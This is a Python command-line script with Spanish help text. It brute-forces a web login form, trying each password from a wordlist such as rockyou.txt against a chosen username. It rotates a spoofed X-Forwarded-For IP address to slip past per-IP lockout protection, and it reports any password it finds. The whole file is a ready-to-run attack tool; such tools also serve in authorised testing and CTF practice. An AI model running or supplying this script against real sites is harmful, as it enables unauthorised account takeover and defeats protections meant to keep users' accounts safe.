#!/usr/bin/python3

from random import randint
import requests, pdb, argparse

parser = argparse.ArgumentParser()
parser.add_argument('-t', dest='target_url', action='store', type=str, 
        help='Web contra la que tirar el ataque -> Ej: http://web.xii/admin.php')
parser.add_argument('-u', dest='user', action='store', type=str, required=False, default="admin",
        help='Usuario por el que nos registramos -> Usuario por defecto "admin"')
parser.add_argument('-d', dest='dict', action='store', type=str, required=False, default='/usr/share/wordlists/rockyou.txt', help="Diccionario -> Por defecto 'rockyuu.txt'")
parser.add_argument('-l', dest='limit', action='store', type=int, required=False, default=5, help="Limite de intentos consecutivos (para los que intentar la misma IP)")
parser.add_argument('-f', dest='form', action='store', type=str, required=False, default="username:password", help="Formulario de peticion, por defecto >  'username:password'")
parser.add_argument('-s', dest='start_at', action='store', type=int, required=False, default=1, help="Parametro por si se ha parado el ataque, para retomar por dicho intento")

args = parser.parse_args()
args = vars(args)
TARGET_URL=args["target_url"]; USERNAME=args["user"]; DICT=args["dict"]
LIMIT=args["limit"]; START_AT=args["start_at"] 
LOGIN_FAILED_ERROR = input("Frase de error ej 'Incorrect username or password.'>   ")
LIMIT_ERROR = input("Frase de error por intentos, ej 'Blacklist protection' >  ")

form = args["form"]; user_param = form.split(':')[0]; pass_param = form.split(':')[-1] 

def attempt_login(password: str, ip: str) -> bool:
    headers = {'X-Forwarded-For': ip}
    data = {user_param: USERNAME, pass_param: password}
    r = requests.post(TARGET_URL, headers=headers, data=data)
    if r.status_code == 500:
        print("[!]  Error en el servidor")
        exit(1)
    if LIMIT_ERROR in r.text:
        print("[!] Numero de intentos fallidos superado, pon otro menos con el parametro [-l]")
        exit(1)
    return LOGIN_FAILED_ERROR not in r.text

def random_ip():
    return ".".join(str(randint(0, 255)) for _ in range(4))

ip = random_ip()
num_attempts = 1
for password in open(DICT):
    if num_attempts < START_AT:
        num_attempts += 1
        continue
    if num_attempts % (LIMIT - 1) == 0:
        ip = random_ip()

    password = password.strip()
    print(f"   > Intento [{num_attempts}] {ip}\t{password}")

    if attempt_login(password, ip):
        print(f"[*] La contrase√±a para [{USERNAME}] es [{password}]")
        break
    num_attempts += 1


